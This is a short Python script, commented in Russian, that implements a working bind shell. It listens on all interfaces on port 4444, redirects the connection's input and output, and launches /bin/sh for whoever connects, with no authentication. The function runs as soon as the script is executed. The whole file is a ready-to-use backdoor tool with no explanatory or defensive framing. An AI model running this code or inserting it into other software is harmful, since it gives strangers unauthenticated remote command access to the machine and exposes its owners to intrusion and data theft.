import socket
import os

def bind_shell(host='0.0.0.0', port=4444):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f'Listening on {host}:{port}...')
        conn, addr = s.accept()
        print(f'Connection from {addr}')
        
        # Дублируем файловые дескрипторы соединения на stdin, stdout и stderr
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)

        # Открываем командную оболочку
        os.system('/bin/sh')

bind_shell()
